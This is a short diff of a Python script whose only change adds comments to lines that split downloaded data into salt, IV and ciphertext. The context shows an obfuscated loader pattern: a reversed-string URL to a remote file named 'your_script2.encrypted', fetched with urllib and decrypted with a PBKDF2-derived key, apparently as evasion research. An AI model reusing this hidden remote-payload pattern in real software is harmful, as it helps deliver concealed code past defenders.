@@ -12,9 +12,9 @@ SCODE_U = "detpyrcne.2tpircs_ruoy/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tn
 encrypted_data=urllib.request.urlopen(SCODE_U[::-1]).read()
 
 # Extract salt, IV, and ciphertext
-salt = encrypted_data[:16]
-iv = encrypted_data[16:32]
-ciphertext = encrypted_data[32:]
+salt = encrypted_data[:16] # first 16 bytes
+iv = encrypted_data[16:32] # next 16 bytes
+ciphertext = encrypted_data[32:] # everything after
 
 # Derive key
 key = PBKDF2(thechallenge, salt, dkLen=32, count=100000)
